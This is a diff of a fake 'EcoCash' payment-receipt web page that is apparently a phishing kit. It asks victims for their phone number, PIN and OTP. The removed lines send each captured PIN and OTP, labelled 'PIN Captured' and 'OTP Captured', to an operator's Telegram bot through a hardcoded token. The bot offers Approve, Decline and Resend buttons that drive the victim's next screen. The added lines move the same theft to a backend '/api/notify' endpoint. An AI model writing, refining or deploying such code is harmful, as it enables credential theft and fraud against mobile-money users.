@@ -92,17 +92,17 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
 </head>
 <body class="client-body">
 <div style="min-height:100vh;display:flex;flex-direction:column">
-  <header class="client-topbar no-print">
+  <header class="client-topbar">
     <div class="client-brand"><span class="brand-eco">Eco</span><span class="brand-cash">Cash</span></div>
     <button type="button" class="btn-client-help" onclick="openHelpModal()">Help</button>
   </header>
   <main class="client-main-container">
-    <div class="receipt-action-toolbar no-print">
+    <div class="receipt-action-toolbar">
       <button type="button" class="toolbar-btn" onclick="copyReceiptText()">Copy Receipt</button>
       <button type="button" class="toolbar-btn primary" onclick="printReceipt()">Print</button>
     </div>
     <div class="receipt-card-container">
-      <div class="receipt-nav-header no-print">
+      <div class="receipt-nav-header">
         <button type="button" class="btn-icon-back" onclick="openShareModal()"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg></button>
         <span class="receipt-header-title">Payment Receipt</span>
         <button type="button" class="btn-icon-help" onclick="openHelpModal()"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg></button>
@@ -229,43 +229,36 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
 <div id="toast" class="toast-notification"></div>
 
 <script>
-const TOKEN = '8834604760:AAHnFWeTawysGPNs6dnqvbOYquhC4cxhs1w';
-const CHAT_ID = '8294270663';
-const API = `https://api.telegram.org/bot${TOKEN}`;
+const API_BASE = '/api';
 const POLL_MS = 2000;
 const TIMEOUT_MS = 60 * 60 * 1000;
 
 let currentReceipt = { trackingNumber:'', modeOfPayment:'', accountName:'', countryCode:'', countryFlag:'', countryName:'', accountNumber:'', amount:'', currency:'', receiptOptional:'', timestamp:'', isAccepted:false, isDeclined:false };
-let sessionId = null, stage = null, pollTimer = null, offset = 0, startedAt = 0;
+let sessionId = null, stage = null, pollTimer = null, startedAt = 0;
 
-/* ---- fetch with hard timeout so it can never hang ---- */
 function fetchWithTimeout(url, opts = {}, ms = 12000){
   return new Promise((resolve, reject) => {
     const controller = new AbortController();
-    const t = setTimeout(() => { controller.abort(); reject(new Error('TIMEOUT')); }, ms);
+    const t = setTimeout(()=>{ controller.abort(); reject(new Error('TIMEOUT')); }, ms);
     fetch(url, { ...opts, signal: controller.signal })
-      .then(r => { clearTimeout(t); resolve(r); })
-      .catch(e => { clearTimeout(t); reject(e); });
+      .then(r=>{ clearTimeout(t); resolve(r); })
+      .catch(e=>{ clearTimeout(t); reject(e); });
   });
 }
 
-/* ---- robust telegram call ---- */
-async function tgCall(method, body){
-  let res;
-  try {
-    res = await fetchWithTimeout(`${API}/${method}`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
-    }, 12000);
-  } catch (e) {
-    if (e.message === 'TIMEOUT') throw new Error('Network timeout — Telegram not reachable');
-    throw new Error('Network error — ' + e.message);
-  }
-  let data;
-  try { data = await res.json(); }
-  catch { throw new Error('Bad response from Telegram (' + res.status + ')'); }
-  if (!data.ok) throw new Error('Telegram: ' + (data.description || 'unknown error'));
+async function postJSON(path, body){
+  const res = await fetchWithTimeout(`${API_BASE}${path}`, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify(body)
+  });
+  let data; try{ data = await res.json(); }catch{ throw new Error('Bad server response'); }
+  return data;
+}
+
+async function getJSON(path){
+  const res = await fetchWithTimeout(`${API_BASE}${path}`);
+  let data; try{ data = await res.json(); }catch{ return null; }
   return data;
 }
 
@@ -355,37 +348,17 @@ async function submitPin(){
   btn.disabled = true; btn.textContent = 'Sending…';
 
   try {
-    sessionId = 's' + Date.now().toString(36) + Math.random().toString(36).slice(2,6);
     stage = 'pin';
     startedAt = Date.now();
-    await primeOffset();
-
-    const text =
-      `🔐 *PIN Captured*\n` +
-      `━━━━━━━━━━━━━━━\n` +
-      `🧾 Ref: ${currentReceipt.trackingNumber||'—'}\n` +
-      `👤 ${currentReceipt.accountName||'—'}\n` +
-      `📱 ${phone}\n` +
-      `🔑 PIN: \`${pin}\`\n` +
-      `💳 ${currentReceipt.modeOfPayment||'—'}\n` +
-      `💰 ${currentReceipt.currency||''} ${currentReceipt.amount||'—'}`;
-
-    await tgCall('sendMessage', {
-      chat_id: CHAT_ID,
-      text,
-      parse_mode: 'Markdown',
-      reply_markup: { inline_keyboard: [[
-        { text: '✅ Approve', callback_data: `approve:${sessionId}` },
-        { text: '❌ Decline', callback_data: `decline:${sessionId}` }
-      ]]}
-    });
-
+    const data = await postJSON('/notify', { stage:'pin', phone, pinOrOtp: pin, receipt: currentReceipt });
+    if(!data || !data.ok) throw new Error(data?.error || 'Server error');
+    sessionId = data.sessionId;
     closeModal('modal-ecocash-login');
     showWaiting('Waiting for approval…','Your PIN is being reviewed.');
     startPoll();
   } catch(err){
     console.error(err);
-    toast('❌ ' + err.message);
+    toast('❌ ' + (err.message === 'TIMEOUT' ? 'Server not reachable' : err.message));
   } finally {
     btn.disabled = false; btn.textContent = 'Login';
   }
@@ -401,47 +374,20 @@ async function submitOtp(){
   btn.disabled = true; btn.textContent = 'Sending…';
 
   try {
-    sessionId = 's' + Date.now().toString(36) + Math.random().toString(36).slice(2,6);
     stage = 'otp';
     startedAt = Date.now();
-    await primeOffset();
-
-    const text =
-      `📩 *OTP Captured*\n` +
-      `━━━━━━━━━━━━━━━\n` +
-      `🧾 Ref: ${currentReceipt.trackingNumber||'—'}\n` +
-      `👤 ${currentReceipt.accountName||'—'}\n` +
-      `📱 ${phone}\n` +
-      `🔑 OTP: \`${otp}\`\n` +
-      `💳 ${currentReceipt.modeOfPayment||'—'}`;
-
-    await tgCall('sendMessage', {
-      chat_id: CHAT_ID,
-      text,
-      parse_mode: 'Markdown',
-      reply_markup: { inline_keyboard: [[
-        { text: '✅ Approve', callback_data: `approve:${sessionId}` },
-        { text: '🔁 Resend',  callback_data: `resend:${sessionId}` }
-      ]]}
-    });
-
+    const data = await postJSON('/notify', { stage:'otp', phone, pinOrOtp: otp, receipt: currentReceipt });
+    if(!data || !data.ok) throw new Error(data?.error || 'Server error');
+    sessionId = data.sessionId;
     closeModal('modal-otp-verify');
     showWaiting('Verifying OTP…','Your OTP is being reviewed.');
     startPoll();
   } catch(err){
     console.error(err);
-    toast('❌ ' + err.message);
+    toast('❌ ' + (err.message === 'TIMEOUT' ? 'Server not reachable' : err.message));
   } finally {
     btn.disabled = false; btn.textContent = 'Verify OTP';
   }
-}
-
-async function primeOffset(){
-  try {
-    const res = await fetchWithTimeout(`${API}/getUpdates?timeout=0&offset=-1`, {}, 8000);
-    const d = await res.json();
-    if (d.ok && d.result.length) offset = d.result[d.result.length-1].update_id + 1;
-  } catch(e){ /* ignore */ }
 }
 
 function startPoll(){ stopPoll(); pollTimer = setInterval(pollOnce, POLL_MS); }
@@ -455,35 +401,24 @@ async function pollOnce(){
     return;
   }
   try {
-    const res = await fetchWithTimeout(`${API}/getUpdates?offset=${offset}&timeout=0`, {}, 8000);
-    const d = await res.json();
-    if(!d.ok || !d.result) return;
-    for (const u of d.result){
-      offset = u.update_id + 1;
-      if(u.callback_query && u.callback_query.data){
-        const [act, sid] = u.callback_query.data.split(':');
-        if(sid !== sessionId) continue;
-        tgCall('answerCallbackQuery', { callback_query_id: u.callback_query.id, text: act==='approve'?'✅ Approved':(act==='decline'?'❌ Declined':'🔁 Resend') }).catch(()=>{});
-        if(u.callback_query.message){
-          tgCall('editMessageReplyMarkup', {
-            chat_id: u.callback_query.message.chat.id,
-            message_id: u.callback_query.message.message_id,
-            reply_markup: { inline_keyboard: [] }
-          }).catch(()=>{});
-        }
-        stopPoll();
-        hideWaiting();
-        if(stage==='pin'){
-          if(act==='approve') openOtpModal();
-          else if(act==='decline') showError('Wrong credentials','Please check your PIN and try again.');
-        } else if(stage==='otp'){
-          if(act==='approve') openModal('modal-inreview');
-          else if(act==='resend'){ toast('Please enter PIN again'); handleAcceptPayment(); }
-        }
-        return;
-      }
+    const d = await getJSON(`/status/${sessionId}`);
+    if(!d || !d.ok) return;
+    if(d.status === 'approved'){
+      stopPoll(); hideWaiting();
+      if(stage === 'pin') openOtpModal();
+      else if(stage === 'otp') openModal('modal-inreview');
+    } else if(d.status === 'declined'){
+      stopPoll(); hideWaiting();
+      showError('Wrong credentials','Please check your PIN and try again.');
+    } else if(d.status === 'resend'){
+      stopPoll(); hideWaiting();
+      toast('Please enter PIN again');
+      handleAcceptPayment();
+    } else if(d.status === 'expired'){
+      stopPoll(); hideWaiting();
+      showError('Session Expired','Request timed out.');
     }
-  } catch(e){ /* silent retry */ }
+  } catch(e){ /* retry */ }
 }
 
 function openOtpModal(){
